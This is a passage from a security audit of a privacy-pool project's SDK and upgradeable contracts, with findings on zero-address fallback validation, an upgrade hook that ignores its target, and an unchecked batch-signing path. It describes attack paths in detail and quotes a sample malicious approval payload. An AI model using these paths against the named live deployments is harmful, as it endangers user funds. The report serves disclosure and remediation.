We also recommend backing both the lock and the throttler with a shared store rather than module-level state, since `ThrottlerModule.forRoot` in `AppModule` takes no `storage` and `@nestjs/throttler` supports one directly; comparing `keys` against itself in `withNullifierLock` so a request carrying the same nullifier twice is rejected before broadcast rather than on chain; marking a signed fee commitment consumed, keyed on `signedRelayerCommitment`, so the replay closes independently of nullifier timing; adding a route-level timeout to `RelayController` mirroring `QUOTE_DEADLINE_MS`; and emitting a per-outcome signal, broadcast, confirmed, reverted or dropped, so a run of reverting duplicates is visible before the wallet is empty rather than after. We also recommend reconciling the three statements the package makes about this guard, because the comment on `inFlightNullifiers` claiming it prevents on-chain reverts, the `BadRequestException` message promising the caller a pending transaction is waited out, and the spec test titled "releases the lock after a successful broadcast so a later retry succeeds" cannot all be right; whichever way the fix goes, two of the three are currently wrong.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #022 — `prepareSwapQuote` accepts the zero address as `fallbackAddress`, which three sibling cross-chain paths reject

**Severity:** Low · **Location:** `packages/sdk/src/services/poolSessions/PoolSessionWithdrawAndSwap.ts` · **Bug:** High · **Payout:** Low · **Novelty:** DIFF · **Reach:** THEORY · **Root cause:** RC-03 (3 findings) · **Status:** Open

#### Description

A cross-chain withdraw-and-swap takes a user's funds out of the pool on one chain and has a bridge provider deliver them, swapped into another asset, on a second chain. The destination leg can fail on arrival, and when it does the provider still holds the bridged tokens and has to send them somewhere. The address it sends them to is the fallback address, and on a cross-chain route it is the last claim the user has on the money: the withdrawal has already happened on the source chain, and there is no source-chain recipient to hand the funds back to, so the route has to name a destination-chain address the funds can be recovered from.

**Where it breaks.** One value must never be named there. The three sibling entry points that build a cross-chain route all reject the zero address explicitly, their shared comment recording that a zero would tell the bridge provider to deliver to the burn address and calling that permanent loss. The fourth, the withdraw-and-swap path, asks only whether the field was filled in, and a zero address is a filled-in field, so the single value the requirement exists to exclude is the one value that satisfies it. A caller that fills the field with a zero placeholder is told nothing, and the zero travels unaltered into the outbound bridge quote, into the fee quote the relayer commits to, and into the SDK's own later re-check, which compares the zero against itself and passes.

In the SDK's cross-chain withdraw-and-swap flow, `PoolSessionWithdrawAndSwap.prepareSwapQuote` takes a preliminary fee quote from the relayer, asks a configured `ISwapQuoteProvider` for a bridge route, re-quotes the relayer for a committed fee, and returns a prepared quote whose bridge calldata is hashed into the zero-knowledge proof's context and executed on chain by `RelaySwaps`. The shipped provider, `LiFiSwapQuoteProvider`, quotes against LiFi.

LiFi's quote request accepts a parameter named `toFallbackAddress`, the destination-chain address that receives the raw bridged tokens when the destination-side action cannot run, which on this flow means the destination swap failing on arrival. The SDK surfaces it to callers as `fallbackAddress`. On a cross-chain route it is mandatory, because there is no source-chain recipient to fall back to: the SDK sets the `recipient` member of the on-chain `SwapRouting` tuple to the zero address as a documented "no source-chain recipient" sentinel, since the real recipient exists only inside the proof-bound LiFi calldata. The withdraw-and-swap design document marks the cross-chain `fallbackAddress` Required and states that the SDK throws otherwise.

`prepareSwapQuote` enforces that requirement with a truthiness test rather than a comparison:

```ts
// PoolSessionWithdrawAndSwap.prepareSwapQuote
if (isCrossChain) {
    if (!fallbackAddress) {
```

`fallbackAddress` is a `string` holding an EVM address in its 42 character hexadecimal form. The SDK's own zero-address constant, `EMPTY_ADDRESS`, is the string literal `"0x0000000000000000000000000000000000000000"`. In JavaScript every non-empty string is truthy, and a 42 character run of zero digits is a non-empty string, so `!fallbackAddress` is `false` for the zero address and the guard rejects an omitted field and nothing else. Detecting a zero address held as a hex string requires comparing it to the zero literal, which is what the sibling paths do and what this one does not.

The value then travels unchanged. `prepareSwapQuote` passes it to `getSwapQuote` on the configured `ISwapQuoteProvider`, and `LiFiSwapQuoteProvider.getSwapQuote` places it on the outbound quote request as `toFallbackAddress`.

Nothing in between restores a default. `prepareSwapQuote` ends by calling its own `assertSwapRouting` helper, which re-checks the routing tuple the relayer signed against an expectation object built from what the caller asked for. That expectation sets `fallbackAddress ?? routingRecipient`, and `??` is nullish coalescing, which substitutes only for `undefined` and `null`. A zero address is neither, so it survives into the expectation, `assertSwapRouting` sees the same zero on both sides, and the check passes. `fallbackAddress` is read three times after the guard: in the LiFi quote request, in the committed relayer quote request, and in that expectation. None of the three is a second comparison or a substitution, and either would have caught the value.

The other three SDK entry points that build a cross-chain LiFi quote compare against `EMPTY_ADDRESS` explicitly, before computing any default:

| entry point | guard on `fallbackAddress` | zero address |
| --- | --- | --- |
| `PoolSessionSwapDeposit.prepareSwapAndDeposit` | `!== undefined && toLowerCase() === EMPTY_ADDRESS.toLowerCase()`, then throw | rejected |
| `PoolSessionReshieldCrosschain.estimateReshieldCrosschainAmount` | `!== undefined && toLowerCase() === EMPTY_ADDRESS`, then throw | rejected |
| `PoolSessionReshieldCrosschain.prepareReshieldCrosschainQuote` | the same comparison, then throw | rejected |
| `PoolSessionWithdrawAndSwap.prepareSwapQuote` | `if (!fallbackAddress)`, then throw | accepted |

```ts
// PoolSessionSwapDeposit.prepareSwapAndDeposit
if (
    params.fallbackAddress !== undefined &&
    params.fallbackAddress.toLowerCase() === EMPTY_ADDRESS.toLowerCase()
) {
```

The three rejecting sites say why. The comment above the guard in `prepareSwapAndDeposit` records that an explicit zero "would tell LiFi to send bridged tokens to the burn address if the destination deposit cannot execute", calls that "permanent loss", and notes that omitting the field defaults to a recoverable destination instead. The two guards in `PoolSessionReshieldCrosschain` repeat that comment and annotate themselves "(Same guard as PoolSessionSwapDeposit.)". Both also compute an `effectiveFallbackAddress` immediately after the check and use that value downstream, so a raw caller-supplied address never reaches a quote. `prepareSwapQuote` does neither.

The same truthiness test is duplicated one layer down, in the LiFi adapter. Both of its quote builders spread the parameter in conditionally:

```ts
// LiFiSwapQuoteProvider.getSwapQuote and LiFiSwapQuoteProvider.getSwapAndDepositQuote
...(params.fallbackAddress ? { toFallbackAddress: params.fallbackAddress } : {}),
```

The condition is the same truthy test on the same string, so the adapter forwards a zero as readily as the session does, and repairing only `PoolSessionWithdrawAndSwap` leaves that second gate open to an integrator that holds an `ISwapQuoteProvider` and calls it directly.

The on-chain leg is inert, and that bounds the defect to the SDK. `fallbackAddress` appears nowhere under the core contracts, and under the swaps contracts only as the declaration `address fallbackAddress;` of a `SwapRouting` member, once in `IRelaySwaps.sol` and once in `RelaySwaps.sol`. Nothing in either tree reads that member; a single read in `execute` or any helper would have falsified this, and there is none. The repository's own remediation summary records the same fact and accepts it: issue #964, "`SwapRouting.fallbackAddress` decoded on-chain but never referenced", is dispositioned Accept because the member is proof-bound across contract, SDK and relayer and "carries cross-chain (LiFi) semantics". That disposition locates the defect rather than contradicting it: the field's only consumer is LiFi, reached through the SDK, so the SDK guard is the only validation the value ever receives. The Solidity tests agree: across the tracked `.sol` files, `fallbackAddress` is assigned `address(0)` 37 times (34 of them in `RelaySwaps.t.sol`, one each in `RelaySwaps.rescue.t.sol`, `RelaySwapsProofBinding.t.sol` and `RelaySwapsB2Fork.t.sol`) and a non-zero value never. One non-zero assignment would have falsified that count. This is an SDK input-validation defect, not an on-chain one.

Five sites share one fix:

| site | current form | reaches a LiFi quote request |
| --- | --- | --- |
| `PoolSessionWithdrawAndSwap.prepareSwapQuote` | `if (!fallbackAddress)` | yes |
| `LiFiSwapQuoteProvider.getSwapQuote` | truthy spread | yes, it builds the request |
| `LiFiSwapQuoteProvider.getSwapAndDepositQuote` | truthy spread | yes |
| `PoolSessionWithdrawAndSwap.relayWithdrawAndSwap` | `if (!fallbackAddress)`, a second copy | no |
| `PoolSessionReshieldCrosschain.relayReshieldCrosschain` | no rejection and no `?? relayerInfo.address` default | no |

The last two rows are assert-only and carry no impact claim: the `relay` functions re-validate a routing tuple the relayer has already signed and neither calls a quote provider, so a zero there matches a zero on the other side of the assert and affects a field nothing reads. They belong in the same patch.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionWithdrawAndSwap.ts#L111-L116
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionWithdrawAndSwap.ts#L164-L177
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/LiFiSwapQuoteProvider.ts#L117-L129
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionSwapDeposit.ts#L119-L129
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionReshieldCrosschain.ts#L163-L168
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L64-L74

#### Impact

Reaching this needs a caller to pass `EMPTY_ADDRESS` into `prepareSwapQuote` explicitly, and there is no attacker role: `fallbackAddress` is caller input, and `assertSwapRouting` is the caller checking the relayer rather than the reverse, so a relayer cannot inject the value. The realistic trigger is an integrator that initialises optional address fields to the zero address instead of leaving them `undefined`, a habit the SDK itself follows elsewhere, since `PoolSessionTransfer` and `PoolSessionDeposit` both build pending-note records with `ownerAddress` set to a supplied value `?? EMPTY_ADDRESS`. Such an integrator hits this on its first cross-chain withdraw-and-swap, and sees no error.

What happens after the zero leaves the SDK is not established. The read-only probe described below settles only the source-chain calldata question, and whether LiFi accepts or rejects a zero is unsettled, because the quote endpoint returned HTTP 200 both for a malformed address and for a parameter name that does not exist, so its status code carries no information about validation.

If a delivery to the zero address is attempted at the destination, the outcome depends on the token. Native ETH and ERC-20 implementations with no zero-recipient check credit `address(0)`, and the value is gone. OpenZeppelin v5 reverts with `ERC20InvalidReceiver`, and the deployed USDC `_transfer` precondition reverts on `require(to != address(0))`. USDC is the asset in the repository's captured cross-chain route fixture, OP USDC to Mainnet USDC, so on the asset this protocol actually bridges a failed destination leg reverts and strands rather than burns. Whether the destination executor swallows that revert or bubbles it decides whether the tokens are retryable, and that is not established.

The guard asymmetry itself is not conditional on any of that: one of four equivalent entry points does not validate an address the other three do.

#### Proof of concept

Two harnesses and one read-only probe accompany this finding.

`fallback-zero.test.ts` is a Vitest file of five tests, imported against an unmodified `packages/sdk/src`. It drops into `packages/sdk/test/unit/services/` and runs from `packages/sdk` with `npx vitest run test/unit/services/fallback-zero.test.ts`; all five pass at this commit. The control shows an omitted `fallbackAddress` is rejected on the cross-chain path. The main case passes `EMPTY_ADDRESS` into `prepareSwapQuote`, observes it arriving unchanged at the mocked `getSwapQuote` and again at the committed relayer quote, and confirms the routing assert did not throw. A third case feeds the identical input to `PoolSessionSwapDeposit.prepareSwapAndDeposit` and gets the rejection. A fourth records a negative result: the relayer's EVM quote service defaults `fallbackAddress ?? recipient` when it builds the routing tuple it signs, and on a cross-chain route the SDK sends `recipient` as the zero sentinel, so an omitted field becomes a zero with no user involved. That value lands only in the on-chain tuple nothing reads, so it is not counted as a reachability path. The fifth stubs `fetch` and shows `LiFiSwapQuoteProvider.getSwapQuote` putting `toFallbackAddress` with the zero value on the outbound URL.

`ZeroRecipient.t.sol` is a Foundry file of seven tests, which drops into `packages/contracts/test/unit/` and runs with `forge test --match-path test/unit/ZeroRecipient.t.sol`, measuring the destination-side cost per token family, with a mutation control asserting that every family delivers normally to a non-zero address, so the divergence is caused by the zero and not by the harness.

A controlled probe of the LiFi quote endpoint this path calls, on the Stargate V2 Arbitrum to Base USDC route, sent five variants: a distinctive valid `toFallbackAddress`, the zero address, the parameter omitted, a malformed value, and an unknown parameter name. On that route the parameter has no observable effect on the returned source-chain calldata. The distinctive probe address appears in none of the returned blobs, and the valid-versus-zero comparison differs in the same words, in the same positions, as the omitted-versus-malformed noise floor, all of them carrying the per-quote `transactionId` that makes any two quotes differ. One occurrence of the probe address, or any difference outside those words, would have falsified that, and there is none. It does not follow that LiFi ignores the field: it may be consumed server side and applied at the destination, which a source-chain calldata comparison cannot see.

Neither harness reaches the destination. No live cross-chain withdraw-and-swap was executed, no destination-chain trace was taken, and no fork test ran, because no archive RPC was available. The USDC case is therefore a local contract reproducing the `require(to != address(0))` precondition of `FiatTokenV2_2`, the deployed USDC implementation, rather than a fork of the token itself. The LiFi probe was read-only, against the quote endpoint, and settles only the source-chain calldata question.

#### Recommendation

We recommend replacing both truthiness guards in `PoolSessionWithdrawAndSwap`, the one in `prepareSwapQuote` and its copy in `relayWithdrawAndSwap`, with the sibling form: reject an omitted `fallbackAddress`, reject `EMPTY_ADDRESS`, compute an `effectiveFallbackAddress`, and use that value everywhere downstream, including in the expectation objects both functions build for `assertSwapRouting`, so a raw caller-supplied `fallbackAddress` never reaches a quote or an assert. Apply the same rejection in `relayReshieldCrosschain`, which today has neither the check nor the `?? relayerInfo.address` default that its two sibling functions in `PoolSessionReshieldCrosschain` apply. Replace the truthy spreads in `LiFiSwapQuoteProvider.getSwapQuote` and `LiFiSwapQuoteProvider.getSwapAndDepositQuote` with an explicit `!== undefined` test plus a zero rejection, so the adapter closes the same gap for an integrator that holds an `ISwapQuoteProvider` directly. Lift the comparison into one helper and call it from every site that takes a caller-supplied `fallbackAddress`, since the three correct copies already annotate themselves as clones of one another.

We also recommend putting the destination question to LiFi and recording the answer: whether the quote endpoint accepts `toFallbackAddress` set to the zero address, and if it does, whether the destination executor attempts delivery to it. That question cannot be answered from outside, because the endpoint returns HTTP 200 for a malformed address and for a parameter name that does not exist.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #023 — `_authorizeUpgrade` discards its argument, so one upgrade can move a proxy onto a foreign `ACCESS_ROUTER`

**Severity:** Low · **Location:** `packages/contracts/src/abstracts/Permissioned.sol` · **Bug:** High · **Payout:** High · **Novelty:** NEW · **Reach:** PRIV · **Status:** Open

#### Description

The system's upgradeable contracts, among them the vault that holds user funds, sit behind proxies so their logic can be replaced without moving the funds. None of them decides for itself who may call a privileged function. Each one asks a single contract, the access router, which holds the role assignments for the whole deployment: who may upgrade, who may pause, who may administer the rest. Governing the system means granting and revoking roles on that router, and revocation is the containment step, the way a compromised or retired key is taken back out.

**Where it breaks.** Which router a proxy asks is not a property of the proxy. It is compiled into the implementation the proxy currently points at, so it travels with the implementation, and the hook that authorises an upgrade never looks at the implementation it is authorising: it takes the candidate address as an unnamed argument and discards it, asking only whether the caller holds the upgrade role on the router in force before the swap. One upgrade is therefore enough to move a proxy onto an access router the rest of the system does not administer, and the move runs one way. Revoking the upgrader's roles afterwards lands on a router the proxy has stopped reading, and the only remedy left is a further upgrade, which the substituted router now gates, so the containment that revocation is supposed to provide is what the discarded argument takes away.

Every upgradeable contract in the system derives its authorisation from `Permissioned`, which stores the router as an implementation-level immutable:

```solidity
IAccessControl public immutable ACCESS_ROUTER;
```

`_checkAccess` resolves to `ACCESS_ROUTER.hasRole(_role, msg.sender)`. Because the value is `immutable`, it is compiled into the implementation's bytecode rather than read from proxy storage, so the authority a proxy answers to is a property of whichever implementation it currently points at, not of the proxy itself. `Permissioned`'s constructor validates the router it is given only for interface shape, through `ERC165Checker.supportsInterface(address(_accessRouter), type(IAccessControl).interfaceId)`, which any contract can satisfy. Nothing validates identity.

All four upgrade hooks discard the address they are asked to authorise:

```solidity
function _authorizeUpgrade(address) internal override checkAccess(UPGRADER_ROLE) {}
```

`PoolVault`, `Entrypoint`, `Keystore` and `ASPRegistry` each declare exactly this line, and a repository-wide search finds no other override outside tests and `ASPRegistryHarness`. The parameter is unnamed and unused; the only question asked is whether the caller holds `UPGRADER_ROLE` *on the router the current implementation was compiled against*. This is the form OpenZeppelin's own `UUPSUpgradeable` NatSpec gives as its worked example, with a role modifier substituted for `onlyOwner`, so the hook is unremarkable on its own. What makes it consequential is the second fact, that the authority itself travels in the implementation.

The two facts compose. A holder of `UPGRADER_ROLE` can call `upgradeToAndCall` with an implementation whose `ACCESS_ROUTER` immutable is an address they control. The upgrade is authorised by the old router; from the next call onward, every `checkAccess` on that proxy consults the new one. Revoking the attacker's role on the real router afterwards changes nothing, because the proxy no longer reads it, and no transaction sent to the real router can reach the proxy again.

The upgrade path is not wholly unguarded. `UUPSUpgradeable._upgradeToAndCallUUPS` calls `IERC1822Proxiable(newImplementation).proxiableUUID()` inside a `try`/`catch` and reverts `ERC1967InvalidImplementation` if the candidate is an externally owned account or a non-UUPS contract, so the proxy cannot be bricked by pointing it at a non-contract. That check establishes that the candidate is *a* UUPS implementation. It says nothing about whose authority that implementation obeys, and a hostile implementation that inherits `UUPSUpgradeable` passes it unchanged.

`DeploymentVerifier` does not close the gap, and it states a coverage claim the code does not meet. `_verifyReferences` carries the NatSpec *"Asserts all inter-contract immutable / initialized references point at the expected peers"* and then checks six: `Entrypoint.poolVault`, `PoolVault.aspRegistry`, `PoolVault.keystore`, both verifier addresses non-zero, `PrivacyPoolRelay.POOL` and `PrivacyPoolRelay.ENTRYPOINT`. `ACCESS_ROUTER` is an inter-contract immutable reference and is not among them; the string `ACCESS_ROUTER` does not appear anywhere in the contracts package's `script` directory. No check reads the ERC-1967 implementation slot, fetches the implementation's runtime, or compares the router it was compiled against with the router the deployment is supposed to use. There is also no upgrade script anywhere in the repository, since no source or script file references `upgradeToAndCall`, so nothing performs a pre-flight check on a candidate implementation before it is proposed.

Nothing here is reachable by an unprivileged party. The four constructors all call `_disableInitializers()`, so the implementations cannot be seized directly, and an upgrade remains a deliberate act by the role holder.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/abstracts/Permissioned.sol#L15-L45
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/interfaces/IPermissioned.sol#L22-L22
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L410-L410
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L151-L151
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Keystore.sol#L194-L194
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/ASPRegistry.sol#L90-L90
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/script/helpers/DeploymentVerifier.sol#L285-L303
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/script/registries/ChainConfigRegistry.sol#L117-L128

#### Impact

One upgrade moves a proxy permanently outside the reach of the access router the rest of the system administers. The router is compiled in rather than stored, so no setter, admin call or role change on the real router brings the proxy back; the only remedy is a further upgrade, which the substituted router now gates.

It buys no new access to funds. `upgradeToAndCall` takes an unconstrained `data` argument that `ERC1967Utils.upgradeToAndCall` hands to `Address.functionDelegateCall` in the proxy's own storage and balance context, so an upgrade transaction can empty the vault by itself, and `setRagequitVerifier` is `checkAccess(UPGRADER_ROLE)` too. What the repoint adds is durable control of the address afterwards. It takes nothing away today, because `Deploy.s.sol`'s `fullDeploy` and each of `_sepoliaConfig`, `_arbitrumConfig` and `_baseConfig` give `defaultAdmin` and `upgrader` one address, and a key holding both roles already has an irreversible lockout available through `AccessRouter` alone. `_arbitrumConfig` and `_baseConfig` call that layout "NOT a production-grade setup: the spec requires distinct multisigs for upgrade and emergency-pause authority before a real mainnet launch". Once the two roles are held separately, the admin tier's revocation is the containment, and this hook defeats it: one upgrade, and the revocation lands on a router the proxies have stopped reading.

On the `prod:v1` stack, `PoolVault` and `Entrypoint` on both Ethereum mainnet and BNB Smart Chain resolve `ACCESS_ROUTER` to `0x40a6bC296D87f71Ab31Ca3Bfb50513441fBD5160`. Read on mainnet, that router returns true for `hasRole(UPGRADER_ROLE, 0x12dbd633…)` and `hasRole(DEFAULT_ADMIN_ROLE, 0x12dbd633…)`; on BNB Smart Chain it returns true for `UPGRADER_ROLE`. That address is an externally owned account with no delay in the path, and the mainnet proxies hold live user custody.

#### Recommendation

We recommend validating the implementation inside `_authorizeUpgrade` instead of discarding it, and requiring that the candidate answers to the same router as the implementation being replaced. `ACCESS_ROUTER()` is already declared on `IPermissioned` and is a public immutable getter living in each implementation's own runtime, so the check is a single external call against the candidate:

```solidity
function _authorizeUpgrade(address _newImplementation) internal override checkAccess(UPGRADER_ROLE) {
  require(
    address(IPermissioned(_newImplementation).ACCESS_ROUTER()) == address(ACCESS_ROUTER),
    Permissioned_AccessRouterMismatch()
  );
}
```

The cast must go through `address(...)` on both sides, since the getter returns `IAccessControl` and contract types are not directly comparable. A candidate that does not expose the getter reverts, which is the correct outcome. Because the hook is duplicated byte-for-byte in all four contracts, put the body in a shared internal helper on `Permissioned`, for example `_requireSameAccessRouter(address)` with `Permissioned_AccessRouterMismatch` declared on `IPermissioned` next to the existing `Permissioned_InvalidAccessRouter`, and have `PoolVault`, `Entrypoint`, `Keystore` and `ASPRegistry` each call it, so the four hooks cannot drift apart later. A codehash or implementation allowlist on top of the router equality is a worthwhile addition, and the change should land before, or together with, any migration that puts `UPGRADER_ROLE` and `DEFAULT_ADMIN_ROLE` in different hands, since an unvalidated hook is what lets a single upgrade put the proxies beyond the admin tier's reach. The check needs an escape hatch, or it becomes a trap of its own. `AccessRouter` is bare OpenZeppelin `AccessControl` with no override of `grantRole`, `revokeRole` or `renounceRole`, and `renounceRole` in that library verifies only that the caller confirms its own address, with no guard against removing the last `DEFAULT_ADMIN_ROLE` holder; `UPGRADER_ROLE` is not among the roles the deploy configuration delegates to `OPS_ADMIN_ROLE`, so `DEFAULT_ADMIN_ROLE` remains its admin. Once that role is vacant, no role on that router can be granted or revoked again, and since `ACCESS_ROUTER` is immutable the only remaining way to move the system onto a fresh router is exactly what strict equality would forbid: upgrading each proxy onto an implementation compiled against the new one. Compare the candidate against an expected-router value held in proxy storage rather than against the compiled-in immutable, gate its setter on an authority that outlives the admin tier, and emit an event on every change, so replacing the router stays a deliberate and recorded step rather than an impossible one.

We also recommend extending `DeploymentVerifier` so its coverage matches its claim: read the ERC-1967 implementation slot of each proxy and assert that the implementation's `ACCESS_ROUTER` equals the router the deployment configured, so a proxy pointing at a foreign-router implementation fails verification rather than passing it. If an upgrade script or runbook is added later, run the same assertion there before broadcasting.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #024 — `submitSelfSubmitBatch` skips the target and selector check that both sibling submit sites apply before signing

**Severity:** Low · **Location:** `packages/sdk/src/services/poolSessions/BatchWithdrawOrchestrator.ts` · **Bug:** High · **Payout:** Low · **Novelty:** DIFF · **Reach:** AUTH · **Root cause:** RC-03 (3 findings) · **Status:** Open

#### Description

A batch withdrawal takes several of a user's shielded notes and withdraws them in one transaction, sent to the on-chain relay contract that executes batches. The SDK builds that transaction in two steps on purpose: a prepare step selects and proves the notes and hands back an unsigned transaction, which is a target address, a blob of calldata and a native value; a separate execute step passes that transaction to the user's wallet to be signed. In between, the transaction is ordinary serializable data that the SDK's own notes say may have round-tripped through UI state, storage or a backend before it comes back, so a prepared transaction is re-checked immediately before signing: that it still points at the contract it is supposed to point at, and that its calldata still decodes to the function it is supposed to call. That check is the settled habit across the prepare-and-execute family.

**Where it breaks.** The self-submit batch, the variant where the user pays their own gas and signs with their own key rather than handing the transaction to a relayer, does not perform it. It copies the target, the calldata and the native value out of the prepared object and asks the wallet to sign them as they stand, and nothing downstream re-derives any of the three. A prepared result altered while it sat outside the SDK is therefore signed as a valid transaction by the user's own key, and on this path alone nothing stands behind the omission: the sibling paths send their transaction to the pool, where a proof is verified and a tampered payload merely fails on chain, whereas a tampered batch need not reach the pool at all. The documentation of the check names its own worst case, an unbounded token approval to an attacker, and the unchecked native value adds an outright transfer of the signer's own funds on top.

In the SDK, a self-submit batch withdrawal is split into a prepare step and an execute step. `BatchWithdrawOrchestrator.prepareSelfSubmitBatch` selects the caller's active notes for one asset, proves a zero-fee transact per note group, encodes the whole batch through `TransactOrchestrator.encodeRelayBatch`, and returns a `SelfSubmitBatchPrepareResult`. `BatchWithdrawOrchestrator.submitSelfSubmitBatch` takes that result back and submits it. This is the variant where the user pays their own gas and signs the transaction with their own wallet rather than handing it to a relayer.

`submitSelfSubmitBatch` reads three fields out of the result and passes them on unchanged:

```ts
// BatchWithdrawOrchestrator.submitSelfSubmitBatch
async submitSelfSubmitBatch(prepared: SelfSubmitBatchPrepareResult): Promise<Hash> {
    return this.core.submit({
        to: prepared.to,
        data: prepared.callData,
        value: prepared.value,
    });
}
```

Nothing downstream re-derives any of the three. `TransactOrchestrator.submit` forwards the object to `PoolVaultInteractor.submitTransaction`, which checks only that a wallet interactor is configured, and calls `IWalletInteractor.sendTransaction`. Both shipped implementations of that interface pass all three fields to the wallet as given: `ViemWalletInteractor` into `walletClient.sendTransaction`, and `EIP1193WalletInteractor` into the parameter object of an `eth_sendTransaction` request. A single assignment anywhere on that chain that overrode `to`, `data` or `value` would falsify this, and there is none. Whatever the result object holds is what the user's wallet is asked to sign.

The SDK has a helper written for this exact moment. `assertPreparedTxMatches` takes a prepared transaction and an expectation of target, ABI and function name; it rejects a mismatched `to`, rejects calldata that will not decode against the ABI, and rejects a decoded function name other than the expected one. Its documentation states the threat model and names the payload it exists to stop:

> Asserts a prepared transaction targets the expected contract and calls the expected function before it is handed to a wallet for signing. Defends the prepare/execute split: an attacker-supplied or tampered `PrepareXResult` could otherwise carry an arbitrary `to` + calldata (e.g. `to: token, data: approve(attacker, MAX)`), and the execute step would sign it blindly.

Three call sites in the SDK submit a transaction through `TransactOrchestrator.submit`. That set is exhaustive: one more would falsify the enumeration below, and there is none. Two of the three assert before submitting.

| submit site | check applied before submitting | how `value` is set |
| --- | --- | --- |
| `PoolSessionTransfer.executeTransfer` | `assertPreparedTxMatches` against the session's pool address, `POOL_VAULT_TRANSACT_ABI` and `transact` | hardcoded `"0x0"`, not read from the result |
| `PoolSessionWithdraw.executeWithdraw` | `assertPreparedTxMatches` against the session's pool address, `POOL_VAULT_TRANSACT_ABI` and `transact` | hardcoded `"0x0"`, not read from the result |
| `BatchWithdrawOrchestrator.submitSelfSubmitBatch` | none | copied from the result |

Both asserting siblings build a fresh `PreparedTransaction` from the result's `to` and `callData`, supply the native value themselves as a literal, and only then call the helper. The batch path differs on all three fields at once.

The discipline is not confined to those two. `PoolSessionDeposit`, `PoolSessionKeystore`, `PoolSessionRagequit` and `PoolSessionSwapDeposit` call the same helper before signing, `PoolSessionSwapDeposit` wrapping it in `assertApprovalTx` to bound the approval amount as well as the spender, and `PoolSessionYieldWithdraw` reaches the same result inline, decoding the prepared calldata against `POOL_VAULT_TRANSACT_ABI` and throwing `UnexpectedWithdrawCalldata` on an unexpected selector. Across the prepare-and-execute family, one execute path signs without a check.

Every field the batch path forwards carries a documented invariant that the code never tests. The declarations of `SelfSubmitBatchPrepareResult` say what each one must be, and `encodeRelayBatch` is the only producer:

| field | what the type declares it to be | what `encodeRelayBatch` always produces | tested at execute time |
| --- | --- | --- | --- |
| `to` | the PrivacyPoolRelay contract | its `relayAddress` argument | no |
| `callData` | ABI-encoded `relayBatch` calldata over every item | `encodeFunctionData` against `PP_RELAY_BATCH_ABI` for `relayBatch` | no |
| `value` | `0x0`, because a self-submit batch forwards no gas funding | the literal `"0x0"` | no |

The `value` row is the sharpest of the three, because the legitimate value is a constant rather than a computed quantity. A prepared result whose `to` and `callData` are entirely genuine, and whose `value` has been changed, still reaches the wallet, and the native transfer rides along with a transaction the user believes is a gas-only self-submitted withdrawal.

Two of the three anchors a check would need are already available where the check belongs. `PP_RELAY_BATCH_ABI` and the function name `relayBatch` are SDK constants, exported from the package, and `encodeRelayBatch` uses both. The third is not: `relayContractAddress` is a member of `SelfSubmitBatchParams`, supplied by the caller at prepare time, and `SelfSubmitBatchPrepareResult` does not carry it, so `submitSelfSubmitBatch` holds no independent copy of the address the transaction is supposed to reach. Asserting the ABI, the function name and a zero `value` is therefore possible today with no signature change; pinning `to` as well needs the relay address added to the result type. The two asserting siblings do not have this problem because their target is the session's own pool address, which the session already holds.

The path is public. `PoolSessionBatchWithdraw.executeSelfSubmitBatch` calls `submitSelfSubmitBatch` and does nothing else to the prepared object first, and `PoolSessionBatchWithdraw.selfSubmitBatchWithdraw` calls prepare and execute back to back. Both are on the session interface, so an integrator that keeps the prepared result between the two steps, which is the reason the split exists, reaches the unchecked path through the ordinary API.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/BatchWithdrawOrchestrator.ts#L330-L339
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/utils/PreparedTxValidation.ts#L7-L24
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionWithdraw.ts#L357-L369
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/types/BatchWithdrawOrchestrator.ts#L120-L130

#### Impact

